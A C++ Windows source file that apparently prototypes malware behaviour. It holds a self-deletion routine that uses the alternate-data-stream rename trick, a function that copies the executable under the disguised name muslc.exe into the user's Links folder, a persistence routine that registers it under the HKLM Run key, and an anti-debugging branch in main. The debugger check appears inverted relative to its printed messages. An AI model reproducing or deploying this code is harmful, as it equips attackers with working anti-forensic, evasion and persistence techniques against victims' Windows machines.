#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include "ReaderHeader.h"

#define NEW_STREAM L":Mommy"

int SelfKurtCobain(void)
{
	PFILE_RENAME_INFO PFRI = NULL;
	size_t nameLength = wcslen(NEW_STREAM) * sizeof(WCHAR);
	size_t sizePrfi = sizeof(FILE_RENAME_INFO) + nameLength;
	FILE_DISPOSITION_INFO FDI = { 0 };
	WCHAR path[MAX_PATH * 2] = { 0 };

	PFRI = (PFILE_RENAME_INFO)calloc(1, sizePrfi);

	if (PFRI == NULL)
	{
		return EXIT_FAILURE;
	}

	FDI.DeleteFile = TRUE;

	PFRI->FileNameLength = nameLength;
	memcpy(PFRI->FileName, NEW_STREAM, nameLength);

	if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}

	HANDLE hFile = CreateFileW(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}


	if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, (DWORD)sizePrfi))
	{
		free(PFRI);
		CloseHandle(hFile);
		return EXIT_FAILURE;
	}

	CloseHandle(hFile);

	HANDLE hFile2 = CreateFileW(path, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile2 == INVALID_HANDLE_VALUE)
	{
		free(PFRI);
		return EXIT_FAILURE;
	}

	if (!SetFileInformationByHandle(hFile2, FileDispositionInfo, &FDI, sizeof(FDI)))
	{
		free(PFRI);
		CloseHandle(hFile2);
		return EXIT_FAILURE;
	}

	CloseHandle(hFile2);
	free(PFRI);

	return EXIT_SUCCESS;
}

void PrintLastErrorMessage()
{
	DWORD errorCode = GetLastError();
	LPWSTR errorMsg = nullptr;

	FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errorCode,
		0, 
		(LPWSTR)&errorMsg,
		0,
		NULL
	);

	if (errorMsg)
	{
		std::wcout << L"Error code: " << errorCode << L"\nMessage: " << errorMsg << std::endl;
		LocalFree(errorMsg); 
	}
	else
	{
		std::wcout << L"Unknown error code: " << errorCode << std::endl;
	}
}

int Persistence(const wchar_t *path)
{
	HKEY hKey = NULL;
	const wchar_t* nameKey = L"Mommy";
	int lstatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

	if (lstatus != ERROR_SUCCESS)
	{
		PrintLastErrorMessage();
		return EXIT_FAILURE;
	}

	int lstatus2 = RegSetValueExW(hKey, nameKey, 0, REG_SZ, (const BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));

	if (lstatus2 != ERROR_SUCCESS)
	{
		PrintLastErrorMessage();
		RegCloseKey(hKey);
		return EXIT_FAILURE;
	}

	RegCloseKey(hKey);
}

int DoubleItSelf(void)
{
	wchar_t* userProfile = nullptr;
	size_t size = 0;
	std::filesystem::path targetPath;

	if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
	{
		targetPath = std::filesystem::path(userProfile) / L"Links" / L"muslc.exe";
		free(userProfile);
	}

	WCHAR newPath[MAX_PATH * 2] = { 0 };

	if (GetModuleFileNameW(NULL, newPath, (MAX_PATH * 2)) == 0)
	{
		return EXIT_FAILURE;
	}

	if (CopyFileW(newPath, targetPath.c_str(), TRUE) == 0)
	{
		return EXIT_FAILURE;
	}

	Persistence(targetPath.c_str());

	return EXIT_SUCCESS;
}

int CopyExists(void)
{
	wchar_t* userProfile = nullptr;
	size_t size = 0;
	std::filesystem::path targetPath;

	if (_wdupenv_s(&userProfile, &size, L"USERPROFILE") == 0 && userProfile != nullptr)
	{
		targetPath = std::filesystem::path(userProfile) / L"Links" / L"muslc.exe";
		free(userProfile);
	}

	if (std::filesystem::exists(targetPath))
	{
		return EXIT_SUCCESS;
	}
	else
	{
		return EXIT_FAILURE;
	}
}

int main(void)
{
	if (!IsDebugged())
	{
		SelfKurtCobain();
		std::cout << "Debugged!" << std::endl;
	}
	else
	{
		if (CopyExists() == EXIT_FAILURE)
		{
			DoubleItSelf();
			std::cout << "Not Debugged!" << std::endl;
		}

		std::cout << "Not Debugged!" << std::endl;
	}
}